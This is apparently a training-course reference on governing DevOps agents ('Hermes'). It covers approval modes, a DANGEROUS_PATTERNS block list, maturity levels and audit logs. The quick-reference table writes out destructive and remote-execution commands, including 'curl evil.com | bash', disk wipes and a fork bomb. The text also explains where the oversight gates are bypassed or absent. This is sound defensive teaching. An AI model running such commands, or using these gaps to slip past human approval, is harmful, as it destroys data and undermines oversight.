# Hermes Governance Reference: Approval Modes, Safety Configuration, and Maturity Levels

**Type:** Reference Document
**Audience:** DevOps practitioners building and operating Hermes agents
**Companion:** Module 13 Lab (hands-on L1→L3 promotion with config application)
**This doc explains WHY — the lab shows HOW**

---

## Overview

Governance is the set of controls that define what an agent is **allowed to do**, what it **cannot do**, and what it **must ask before doing**. In Hermes, governance is not a bolt-on feature — it is a core design principle expressed through two layers that work in tandem.

This reference covers:

- The governance problem and why two layers are needed
- Hermes's behavioral governance layer (SOUL.md NEVER rules)
- Hermes's mechanical governance layer (DANGEROUS_PATTERNS + approval gates)
- The four maturity levels (L1–L4) and the promotion framework
- The three approval modes (manual, smart, auto) and when to use each
- Audit logging architecture and what the trail looks like
- Course examples with specific file paths and diff commands

Read this document before or after Module 13. It is the conceptual map. The lab is the territory.

---

## Section 1 — What Is Agent Governance and Why Does It Exist?

### The Governance Problem

An agent that can do anything is useful but dangerous. An agent that can do nothing is safe but useless. Governance is the calibration between those two extremes.

The core tension is this: the more autonomy you give an agent, the more value it can deliver — but the more potential damage it can cause when it makes a mistake. Mistakes are not hypothetical. LLMs misinterpret ambiguous instructions. Context windows fill up and earlier constraints are forgotten. Edge cases that were never written in a SOUL.md surface at 2 AM during an incident.

Governance does not exist because agents are untrustworthy. It exists because:

1. **LLM compliance is probabilistic, not deterministic.** A model that follows NEVER rules 99.9% of the time will violate them 1 in 1000 times. At scale, that matters.
2. **Humans need observability.** Even when an agent behaves correctly, operators need to understand what it did and why. Audit logs and approval gates provide that visibility.
3. **Risk is not uniform.** Running `EXPLAIN` on a slow query carries different risk than running `DROP TABLE`. Governance calibrates the control level to the actual risk.
4. **Trust must be earned, not assumed.** A new agent in a new environment should operate under tighter constraints until it has demonstrated consistent, correct behavior. Promotion from L1 to L4 is the mechanism for that earned trust.

### The Two Layers of Governance in Hermes

Hermes governance operates at two distinct levels that provide defense in depth:

**Layer 1: Behavioral governance (SOUL.md NEVER rules)**

The agent's own values and constraints, encoded in its identity file. NEVER rules in SOUL.md are the most human-readable form of governance — they describe, in plain language, what the agent will refuse to do regardless of what a user asks.

Examples from real course agents:

- Aria (Track A, DBA): `NEVER execute ALTER TABLE, CREATE INDEX, or any DDL without explicit human approval`
- Finley (Track B, FinOps): `NEVER execute aws ec2 terminate-instances under any circumstances — this destroys infrastructure`
- Kiran (Track C, K8s): `NEVER execute kubectl delete without human approval`
- Morgan (Fleet Coordinator): `NEVER run database queries — delegate to track-a`

SOUL.md NEVER rules are loaded at agent startup and apply to every interaction. They shape the LLM's behavior from the inside — the agent internalizes these constraints as part of its identity.

**The important caveat:** Behavioral governance relies on LLM compliance. An LLM that has processed a NEVER rule will almost always follow it — but "almost always" is not "always." Behavioral governance is strong but not deterministic.

**Layer 2: Mechanical governance (DANGEROUS_PATTERNS + approval gates)**

A deterministic runtime check that fires every time the agent attempts to execute a command via the terminal tool. The check is implemented in `tools/approval.py` and runs regardless of what the SOUL.md says, regardless of the agent's reasoning, and regardless of the user's instruction.

When the terminal tool is asked to execute a command:
1. The command string is passed to `detect_dangerous_command()` in `tools/approval.py`
2. The command is normalized (ANSI sequences stripped, Unicode normalized, null bytes removed) to prevent obfuscation
3. The normalized command is matched against `DANGEROUS_PATTERNS` using regex
4. If a match is found, the approval gate fires based on the configured `approvals.mode`
5. If no match is found, the command executes immediately

Mechanical governance is deterministic. It always fires on a pattern match. It does not care what the LLM intended.

**Why two layers?**

The two layers address different failure modes:

| Failure Mode | Layer 1 (Behavioral) | Layer 2 (Mechanical) |
|---|---|---|
| Agent misunderstands instructions | NEVER rules create strong baseline resistance | Approval gate catches the result anyway |
| Rare LLM compliance failure | Doesn't help — the rule was "forgotten" | Approval gate fires regardless |
| Novel edge case not in SOUL.md | Not covered | Covered if command matches DANGEROUS_PATTERNS |
| Agent operating correctly, human needs visibility | Not provided | Approval events create an audit trail |

The layers are complementary, not redundant. SOUL.md NEVER rules provide broad, domain-aware behavioral constraints. DANGEROUS_PATTERNS provides narrow, deterministic mechanical enforcement for the highest-risk command categories.

**Critical distinction for Track B and Track C:** `aws ec2 terminate-instances` and `kubectl delete` are NOT in Hermes `DANGEROUS_PATTERNS`. Safety for these commands is entirely behavioral (SOUL.md NEVER rules). This is an intentional design decision documented in `course/governance/governance-L4-track-b.yaml` and `course/governance/governance-L4-track-c.yaml`. The implication: removing NEVER rules from Finley or Kiran's SOUL.md would leave no mechanical backstop for those commands.

### The Maturity Spectrum: L1 Through L4

The maturity levels describe a progression from fully-supervised operation to semi-autonomous production operation. The levels are not arbitrary — they map to observable trust milestones.

**L1 — Assistive**

The agent cannot run any commands. It reads web resources and loaded skills, then proposes actions as text. The human reviews every proposed step and executes it manually.

This is the correct starting point for a new agent in a new environment. You learn what the agent proposes before you let it act. You build intuition for where it excels and where it confuses itself. You discover what SOUL.md rules need to be tightened before giving it a terminal.

L1 is not a penalty. It is a structured onboarding period.

**L2 — Advisory**

The agent can run read-only diagnostic commands autonomously. Any command matching Hermes DANGEROUS_PATTERNS triggers a manual approval gate — the agent pauses, presents the command to the human, and waits for a decision before proceeding.

L2 is appropriate when you trust the agent to run diagnostics (SELECT, EXPLAIN, kubectl get, aws ce) but want a human in the loop for anything that could change state. Most course labs run at L2 — it teaches the approval workflow before participants have built enough confidence for L3.

**L3 — Proposal**

The agent runs diagnostic commands autonomously. For flagged (dangerous) commands, an auxiliary LLM reviews the command before the human does. The auxiliary LLM auto-approves low-risk flagged commands (e.g., a SELECT that happened to match a pattern keyword) and escalates genuinely high-risk commands (DROP, DELETE without WHERE) to the human.

L3 reduces approval fatigue caused by false positives — commands that match a pattern but are not actually dangerous. It is appropriate when the agent has a demonstrated track record at L2 with minimal false-positive approval events.

**L4 — Semi-autonomous**

The agent runs both diagnostic commands and pre-approved patterns without human intervention. The `command_allowlist` specifies description-key strings from `DANGEROUS_PATTERNS` that are permanently pre-approved for this agent's specific use case. Novel high-risk commands still trigger smart approval escalation.

L4 is appropriate for production deployment of an agent that has completed L2 and L3 periods with documented, positive behavioral evidence. It is not the goal for course labs — it is the destination of the promotion journey.

### What Governance Is NOT

Governance is not about distrust. Even the most reliable, battle-tested agent benefits from audit logs and approval gates — not because it will misbehave, but because humans need observability to understand what agents are doing at scale.

Governance is not about limiting capability. An L4 agent with a well-tuned `command_allowlist` and a tight SOUL.md is more capable, not less — because operators are confident deploying it to production.

Governance is not a one-time configuration. The maturity level is reviewed and updated as the agent's track record grows. An agent that demonstrated L3 behavior for six months earns L4 promotion. An agent that triggers unexpected approval requests gets downgraded and reviewed.

### Enterprise Context

Hermes governance maps to common enterprise AI governance frameworks:

- **Least-privilege principle:** L1 agents have only [web, skills] toolsets. No terminal access until demonstrated need.
- **Separation of duties:** Behavioral governance (SOUL.md, written by the agent designer) is separate from mechanical governance (DANGEROUS_PATTERNS, maintained by the platform team).
- **Audit trails:** Every approval decision and every DANGEROUS_PATTERNS match is logged. Auditors can reconstruct what an agent did and who approved it.
- **Change management:** L3 → L4 promotion requires documented evidence of correct behavior, not just a config change. The promotion criteria framework below is the change record.
- **Defense in depth:** Two-layer governance means no single failure (LLM compliance or config error) exposes the system to unchecked risk.

L3 maps to "proposal mode" in many enterprise AI governance frameworks — the agent proposes actions, an automated risk assessment filters low-risk items, and humans review only the genuinely ambiguous or high-risk ones.

---

## Section 2 — Hermes-Specific Implementation

### How `tools/approval.py` Works

The approval system has three components: pattern detection, approval orchestration, and session state.

**Pattern detection:** `detect_dangerous_command()` in `tools/approval.py` is the single entry point for all dangerous command checks. Before matching, the command string is normalized:

```python
# From tools/approval.py
def _normalize_command_for_detection(command: str) -> str:
    from tools.ansi_strip import strip_ansi
    command = strip_ansi(command)        # Strip ANSI escape sequences
    command = command.replace('\x00', '') # Strip null bytes
    command = unicodedata.normalize('NFKC', command)  # Normalize Unicode
    return command
```

The normalization prevents obfuscation attacks where an agent (or a malicious user) encodes a dangerous command in a way that visually looks different but executes identically.

**Approval orchestration:** `check_all_command_guards()` is the main entry point called by the terminal tool before executing any command. It:

1. Checks the environment type — container environments (docker, modal, daytona) bypass all checks
2. Checks for HERMES_YOLO_MODE — bypass mode for development/testing only
3. Runs the Tirith security checker (if installed) and dangerous pattern detection in parallel
4. Combines all warnings into a single approval request
5. Dispatches to the appropriate approval path based on `approvals.mode`

**Session state:** Approvals are tracked per-session using thread-safe data structures. When a human approves a command "for this session," that pattern is marked approved for the remainder of the conversation. When a human approves "always," the pattern is written to `command_allowlist` in `config.yaml` and persists across sessions.

### The Three Approval Modes in Detail

**`manual` — Every DANGEROUS_PATTERNS match requires human approval**

This is the L2 default. When a dangerous command is detected:

1. The terminal tool pauses execution
2. The command and description are presented to the human
3. The human chooses: `[o]nce` | `[s]ession` | `[a]lways` | `[d]eny`
4. A timeout applies (default 300 seconds from `approvals.timeout`) — timeout is treated as denial

The choice semantics:
- `once`: approve this specific execution. Next time the same pattern is detected, ask again.
- `session`: approve this pattern for the rest of this conversation session
- `always`: approve this pattern permanently (written to `command_allowlist` in config.yaml)
- `deny`: block execution. The agent is told "BLOCKED: User denied. Do NOT retry."

In gateway mode (Slack, Telegram, Discord), the approval prompt is delivered as a message and the agent thread blocks until the human responds with `/approve` or `/deny`. The `approvals.timeout` defaults to 300 seconds in gateway mode as well.

**`smart` — Auxiliary LLM auto-approves low-risk flagged commands**

This is the L3 default. The same pattern detection runs, but before presenting to the human, the approval system calls an auxiliary LLM:

```python
# From tools/approval.py — the smart approval prompt
prompt = f"""You are a security reviewer for an AI coding agent.
Command: {command}
Flagged reason: {description}

APPROVE if the command is clearly safe
DENY if genuinely dangerous
ESCALATE if uncertain

Respond with exactly one word: APPROVE, DENY, or ESCALATE"""
```

The auxiliary LLM is a lighter, faster model used specifically for risk assessment. It evaluates the actual risk of the command in context, not just the pattern match. A command like `python -c "print('hello')"` is flagged as "script execution via -c flag" but is clearly safe — the auxiliary LLM returns APPROVE and execution proceeds without human intervention.

Smart approval eliminates approval fatigue caused by false positives while preserving human oversight for genuinely risky commands. The pattern still fires (the audit trail is maintained), but routine false positives are resolved automatically.

When the auxiliary LLM is unavailable (no credentials configured, API error), smart mode falls back to `escalate` — the command is presented to the human for manual approval.

**`auto` (mode: `off` in some configs) — No human approval required**

All approval gates are bypassed. Every command executes regardless of DANGEROUS_PATTERNS matches. This mode exists for:

- Containerized environments (docker, modal, daytona) where the sandbox provides isolation
- HERMES_YOLO_MODE development flag
- Explicitly configured L4 contexts where full autonomy is justified and documented

`auto` mode is never appropriate for a first deployment in a new environment, production systems without audit review, or situations where the operator cannot explain why approval is unnecessary for each DANGEROUS_PATTERNS category.

### The DANGEROUS_PATTERNS List

`DANGEROUS_PATTERNS` in `tools/approval.py` is a list of `(regex, description)` tuples. The description key is the human-readable label used in approval prompts and audit logs. The categories cover:

**File system destruction:**
- `recursive delete` — `rm -rf` variants. Matches `\brm\s+-[^\s]*r` and long flags. Even `rm -rf ./temp/` in a context where `temp/` is misidentified can be catastrophic.
- `delete in root path` — `rm /path` starting from root. Prevents wiping system directories.
- `find -exec rm` and `find -delete` — find-based bulk deletion. Particularly dangerous in pipelines where the find scope might be broader than intended.

**Permission and ownership changes:**
- `world/other-writable permissions` — chmod 777 or o+w patterns. World-writable files are a security risk on shared systems.
- `recursive chown to root` — chown -R root. Changing ownership of a directory tree to root can lock out the running user.

**Database mutations:**
- `SQL DROP` — `DROP TABLE` or `DROP DATABASE`. Irreversible data destruction.
- `SQL DELETE without WHERE` — `DELETE FROM tablename` with no WHERE clause. Full table truncation disguised as a targeted delete.
- `SQL TRUNCATE` — `TRUNCATE TABLE`. Same effect as DELETE without WHERE, but faster and less recoverable.

**System manipulation:**
- `format filesystem` — mkfs variants. Formats a disk/partition entirely.
- `disk copy` — dd with if= argument. Can overwrite entire disks.
- `write to block device` — redirection to /dev/sd*. Same risk as dd.
- `stop/disable system service` — systemctl stop/disable/mask. Can stop critical services.
- `kill all processes` — kill -9 -1. Kills every process the current user can reach.
- `fork bomb` — :(){ :|:& };: pattern. Exhausts process table, effectively requiring reboot.

**Shell execution patterns:**
- `shell command via -c flag` — bash/sh/zsh -c or combined flags like -lc, -ic. Commonly used to execute dynamically constructed commands that can bypass other protections.
- `script execution via -e/-c flag` — python/perl/ruby/node -e or -c. Same risk.
- `pipe remote content to shell` — curl/wget | bash. Remote code execution via network.
- `execute remote script via process substitution` — bash <(curl ...). Same risk with different syntax.

**Self-protection patterns:**
- `start gateway outside systemd` — prevents the agent from starting a second gateway process outside the managed service.
- `kill hermes/gateway process` — prevents the agent from terminating its own runtime.

**Sensitive file write patterns:**
- `overwrite system config` — redirection to /etc/. System configuration files.
- `overwrite system file via tee/redirection` — tee and >> targeting ~/.ssh/, ~/.hermes/.env, /etc/. Covers shell expansion patterns like $HOME/.ssh.

**Why this matters for course agents:**

Track A (DBA) encounters `SQL DROP`, `SQL DELETE without WHERE`, `SQL TRUNCATE` — the three patterns most likely to fire during real DBA work. The approval gate is the mechanical backstop for Aria's NEVER DDL rule.

Track B (FinOps) and Track C (Kubernetes) rarely encounter DANGEROUS_PATTERNS in normal operation — their destructive commands (`aws ec2 terminate-instances`, `kubectl delete`) are intentionally not in the list. SOUL.md NEVER rules are the sole governance mechanism for those commands.

The fleet coordinator has no terminal, so DANGEROUS_PATTERNS never fires for Morgan at all. Morgan's governance is purely behavioral — the coordinator pattern is enforced via SOUL.md rules.

### Audit Logging

Every approval event creates a log entry. The audit trail is the evidence base for promotion decisions, incident reviews, and compliance reporting.

**What gets logged:**

In CLI mode, the approval interaction is written to the standard Hermes session log. In gateway mode, the approval request and response are recorded in the session's SQLite state database.

For cron-scheduled jobs, the scheduler in `cron/scheduler.py` saves all agent output to `~/.hermes/cron/output/{job_id}/{timestamp}.md`. When an agent has nothing new to report, it can begin its response with `[SILENT]` (the `SILENT_MARKER` constant defined in `cron/scheduler.py`) — this suppresses delivery to the messaging platform, but the output is still saved locally for audit. The audit trail is never suppressed, even when delivery is.

**The audit entry schema includes:**
- Command that was flagged
- Pattern description key (e.g., "SQL DROP", "recursive delete")
- Approval decision (once/session/always/deny, or smart-approved/smart-denied)
- Session identifier
- Timestamp

**Why the audit trail matters:**

The audit trail is not bureaucracy. It is the evidence that answers:
- "Did the agent attempt anything dangerous in the last 30 days?"
- "How many approval events occurred per session?"
- "Were there false positives that should be added to the command_allowlist?"
- "Is this agent ready for L3 promotion?" (low false-positive rate + no unexplained dangerous attempts)

### The `command_allowlist`

The `command_allowlist` in `config.yaml` contains description-key strings from `DANGEROUS_PATTERNS`. Any pattern whose description key appears in the allowlist bypasses the approval gate entirely — the command executes without prompting.

Example from `tools/approval.py`:
```python
# The description "SQL DROP" corresponds to the pattern for DROP TABLE/DATABASE
DANGEROUS_PATTERNS = [
    ...
    (r'\bDROP\s+(TABLE|DATABASE)\b', "SQL DROP"),
    ...
]
```

If `command_allowlist: ["SQL DROP"]` appears in `config.yaml`, then any command matching the `DROP TABLE|DROP DATABASE` regex will execute without an approval prompt.

**At the course level, all L4 `command_allowlist` entries are empty.** This is intentional. Adding entries to the allowlist is a security decision that requires:

1. Understanding which specific command patterns the agent will legitimately need
2. Confirming those patterns are safe in the specific deployment context
3. Documenting the rationale for the allowlist entry

The empty allowlist in `course/governance/governance-L4-track-a.yaml` is a template starting point, not a production configuration.

---

## Section 3 — DevOps Examples

### Track A (DBA) Governance Profile

Aria (Track A) operates at L2 Advisory in the course labs. The governance profile reflects the nature of DBA work:

**Why read-only as default?** A DBA agent that can execute DDL autonomously is dangerous in any environment — development, staging, or production. Schema changes are irreversible in most cases. Aria's SOUL.md NEVER rules (`NEVER execute ALTER TABLE, CREATE INDEX, or any DDL`) combined with L2 manual approval for DANGEROUS_PATTERNS creates two independent barriers against accidental data loss.

**Why do parameter group changes require approval?** RDS parameter group changes can trigger database restarts. A restart during business hours causes service downtime. This is exactly the kind of high-impact, low-frequency operation that should have human approval — not because the agent will misuse it, but because human awareness is operationally important.

**What a promotion from L2 to L3 looks like:**

After two weeks of Track A running 100 diagnostic sessions with:
- 0 DANGEROUS_PATTERNS violations attempted
- Low false-positive approval rate (EXPLAIN queries rarely match SQL patterns)
- Escalation policy triggers correctly identified and escalated

The operator reviews the audit trail and approves L3 promotion. The config change is:

```yaml
# Before (L2)
approvals:
  mode: manual

# After (L3)
approvals:
  mode: smart
```

Diff: `diff course/governance/governance-L2.yaml course/governance/governance-L3.yaml`

### Track B (FinOps) Governance Profile

Finley (Track B) presents an important teaching case: the most dangerous FinOps commands are NOT in DANGEROUS_PATTERNS.

`aws ec2 terminate-instances` can destroy production infrastructure and generate unexpected cost from replacement provisioning. But it does not appear in `tools/approval.py` DANGEROUS_PATTERNS. The safety mechanism is entirely behavioral — Finley's SOUL.md NEVER rule: `NEVER execute aws ec2 terminate-instances under any circumstances`.

This means:
- The mechanical approval gate will NOT fire for `aws ec2 terminate-instances`
- If Finley's SOUL.md NEVER rule were removed, there would be no mechanical backstop
- The `command_allowlist` in Track B's L4 governance has no entries, and adding `aws ec2 terminate-instances` would have no effect (since it's not in DANGEROUS_PATTERNS)

This is documented explicitly in `course/governance/governance-L4-track-b.yaml`:

> Track B note: aws ec2 terminate-instances and modify-instance-attribute are NOT in Hermes DANGEROUS_PATTERNS. Safety for these commands is enforced via SOUL.md NEVER rules (behavioral), not the approval gate (mechanical).

The implication for governance design: SOUL.md NEVER rules are load-bearing for Track B. They are not redundant safety margin — they are the primary (and only) control for the most dangerous FinOps commands.

### Track C (Kubernetes) Governance Profile

Kiran (Track C) follows the same pattern as Track B. `kubectl delete`, `kubectl drain`, and `kubectl cordon` are not in DANGEROUS_PATTERNS — they are governed exclusively by SOUL.md NEVER rules.

The distinction matters in the context of K8s incidents. During an OOM event, an operator might be tempted to tell Kiran to drain a node to force pod rescheduling. Kiran's SOUL.md rule prevents this:

```
NEVER execute kubectl drain — node drainage affects all workloads; always escalate
```

Without this SOUL.md rule, the mechanical governance layer provides no protection. The L4 governance for Track C (`course/governance/governance-L4-track-c.yaml`) explicitly documents this.

### Fleet Coordinator Governance

Morgan (fleet coordinator) has manual approval mode in config.yaml even though it has no terminal access (`platform_toolsets.cli: [web, skills]`). This might seem redundant — if Morgan can't run commands, what is the approval gate protecting?

The approval gate on the fleet coordinator serves two purposes:

1. **Delegation scope control:** Morgan synthesizes specialist findings and may route escalations. In gateway mode, the approval gate can be triggered for delegation-level decisions that require human acknowledgment before cross-domain remediation proceeds.
2. **Defense against profile misconfiguration:** If a misconfiguration accidentally gave Morgan terminal access, the manual approval gate would immediately catch any dangerous command attempts before they execute.

The pattern is: governance is configured conservatively even when the current configuration makes it seem unnecessary. Configuration can change; governance should be robust to those changes.

### Promotion Narrative Example

The following narrative illustrates how a promotion decision is documented and justified:

**Evidence period:** 2026-02-01 through 2026-03-15 (6 weeks)

**Agent:** Track A (Aria) at L2 Advisory

**Activity summary:**
- 147 diagnostic sessions
- 0 DANGEROUS_PATTERNS matches triggered (all DBA operations were SELECT, EXPLAIN, SHOW)
- 12 successful escalations (correctly identified 9 slow query events and 3 parameter drift events)
- 0 false negatives (no dangerous operations proposed without approval)
- 0 unexpected approval requests from the human operator

**Promotion decision:** L2 → L3 approved on 2026-03-20

**Rationale:** The audit trail shows 6 weeks of correct operation with zero false positives or unexpected behavior. Smart approval is appropriate because the auxiliary LLM can handle any ambiguous SQL pattern false positives without operator fatigue. The agent has demonstrated it understands its SOUL.md boundaries.

**Config change applied:** `approvals.mode: manual` → `approvals.mode: smart`

**Review date:** 2026-06-20 (3 months post-promotion)

---

## Section 4 — Course Examples

The following course artifacts are the concrete implementations of the concepts in this reference. Read this document first, then inspect the files to see how the concepts are expressed in configuration.

**Governance YAML fragments:**

- `course/governance/governance-L1.yaml` — L1 Assistive: no terminal (`cli: [web, skills]`), manual approval mode. The starting template for any new agent.
- `course/governance/governance-L2.yaml` — L2 Advisory: terminal enabled, manual approval. The lab default for all tracks.
- `course/governance/governance-L3.yaml` — L3 Proposal: terminal enabled, smart approval. Target after demonstrating L2 track record.
- `course/governance/governance-L4-track-a.yaml` — L4 Semi-autonomous for Track A (DBA). Smart approval, empty allowlist with explanation of why nothing is pre-approved at course level.
- `course/governance/governance-L4-track-b.yaml` — L4 Semi-autonomous for Track B (FinOps). Explicitly documents that aws ec2 destructive commands are not in DANGEROUS_PATTERNS.
- `course/governance/governance-L4-track-c.yaml` — L4 Semi-autonomous for Track C (Kubernetes). Same documentation for kubectl destructive commands.

**Diff commands to see what changes between levels:**

```bash
# See what L2 adds to L1 (adding terminal access)
diff course/governance/governance-L1.yaml course/governance/governance-L2.yaml

# See what L3 changes from L2 (approval mode only)
diff course/governance/governance-L2.yaml course/governance/governance-L3.yaml

# See what L4 Track A documents vs L3 (mostly comments, empty allowlist)
diff course/governance/governance-L3.yaml course/governance/governance-L4-track-a.yaml
```

**Implementation files:**

- `tools/approval.py` — Complete DANGEROUS_PATTERNS list, approval mode orchestration, smart approval LLM integration, session state management, gateway blocking approval.
- `cron/scheduler.py` — SILENT_MARKER constant, cron output saving for audit trail.

**The Module 13 lab** walks the L1→L3 promotion with hands-on config application. This document explains the conceptual model. The lab provides the step-by-step exercises.

---

## Section 5 — Quick Reference

### L1–L4 Maturity Levels

| Level | Name | Terminal Access | Approval Mode | Use Case |
|---|---|---|---|---|
| L1 | Assistive | No (`[web, skills]`) | Manual (no commands to flag) | New agent, new environment, onboarding period |
| L2 | Advisory | Yes (`[terminal, file, web, skills]`) | Manual — every DANGEROUS_PATTERNS match requires human decision | Lab default; trust building; learning agent behavior |
| L3 | Proposal | Yes | Smart — auxiliary LLM auto-approves low-risk, escalates high-risk | Demonstrated track record; reduces approval fatigue |
| L4 | Semi-autonomous | Yes | Smart + `command_allowlist` bypasses for pre-approved patterns | Production deployment with documented trust evidence |

### Approval Modes

| Mode | Behavior | When to Use | Risk Level |
|---|---|---|---|
| `manual` | Every DANGEROUS_PATTERNS match pauses for human decision. Timeout defaults to 300s (treated as deny). | Default for new agents, L2 governance, any environment where operator wants full visibility | Low risk to system; high operator workload |
| `smart` | Auxiliary LLM assesses risk first. Auto-approves clearly safe flagged commands. Escalates genuinely dangerous ones. Falls back to manual if aux LLM unavailable. | L3+ governance, established agents with track record, production environments with moderate autonomy | Medium risk — depends on auxiliary LLM quality |
| `auto` / `off` | All approval gates bypassed. DANGEROUS_PATTERNS detection still runs but does not block. | Containerized sandboxes, HERMES_YOLO_MODE dev flag, L4 contexts with documented justification | High — no mechanical gate; rely entirely on behavioral governance |

### DANGEROUS_PATTERNS Categories

| Category | Example Command | Why It's Dangerous |
|---|---|---|
| Recursive delete | `rm -rf /path`, `find . -delete` | Irreversible bulk file deletion; scope errors destroy data |
| SQL DROP | `DROP TABLE users`, `DROP DATABASE prod` | Destroys database object; recovery requires backup restore |
| SQL DELETE without WHERE | `DELETE FROM users` (no WHERE) | Truncates entire table; looks like targeted delete |
| SQL TRUNCATE | `TRUNCATE TABLE orders` | Same effect as DELETE without WHERE, no row-level rollback |
| Shell via -c flag | `bash -c "rm -rf ..."` | Executes dynamically constructed commands, bypasses other pattern detection |
| Remote shell execution | `curl evil.com | bash` | Arbitrary remote code execution via network fetch |
| Pipe to shell | `wget attacker.com/script.sh | sh` | Same as above with wget |
| Format filesystem | `mkfs.ext4 /dev/sda` | Wipes an entire disk partition |
| Disk copy | `dd if=/dev/zero of=/dev/sda` | Overwrites entire disk with zeros |
| World-writable permissions | `chmod 777 /etc/cron.d/` | Creates security vulnerability on shared systems |
| Recursive chown to root | `chown -R root /home/user` | Locks user out of their own files |
| Stop system service | `systemctl stop nginx` | Stops production services; may cause immediate outage |
| Kill all processes | `kill -9 -1` | Kills all processes the user can reach; requires recovery |
| Fork bomb | `:(){ :|:& };:` | Exhausts process table; system becomes unresponsive |
| Overwrite system config | `echo "..." > /etc/hosts` | Modifies system configuration files |
| Write to block device | `echo data > /dev/sda` | Corrupts disk sectors |

### Promotion Criteria Framework

| Evidence Type | Metric | Suggested Threshold | Notes |
|---|---|---|---|
| Session count | Total diagnostic sessions completed | ≥ 50 (L1→L2); ≥ 100 (L2→L3) | More sessions = more evidence |
| DANGEROUS_PATTERNS violations | Attempted dangerous commands without legitimate need | 0 | Any violation resets the clock |
| False positive rate | Approval events triggered by safe commands | < 5% of sessions | High false-positive rate suggests SOUL.md needs tightening |
| Escalation correctness | Escalations that were genuinely needed | ≥ 90% correct | Low rate suggests agent over-escalates |
| Unexpected behavior events | Surprises outside expected operating pattern | 0 | Any surprise requires review before promotion |
| Evidence period | Duration of observation | ≥ 2 weeks (L2→L3); ≥ 4 weeks (L3→L4) | Longer periods reduce sample bias |

### Is Your Governance Config Production-Ready? Checklist

- [ ] SOUL.md NEVER rules cover the most dangerous actions for this domain (not just generic AI safety rules)
- [ ] `approvals.mode` is set to `manual` for first deployment; `smart` only after documented L2 track record
- [ ] `command_allowlist` entries are documented with rationale — no silent pre-approvals
- [ ] `approvals.timeout` is set appropriate to the deployment context (300s for interactive sessions; lower for automated pipelines)
- [ ] Audit log location is known and accessible to operators responsible for the promotion decision
- [ ] For Track B/C agents: SOUL.md NEVER rules for non-DANGEROUS_PATTERNS commands are treated as load-bearing safety controls, not optional guidance
- [ ] Promotion decision is documented with evidence period, session count, violation count, and reviewer sign-off
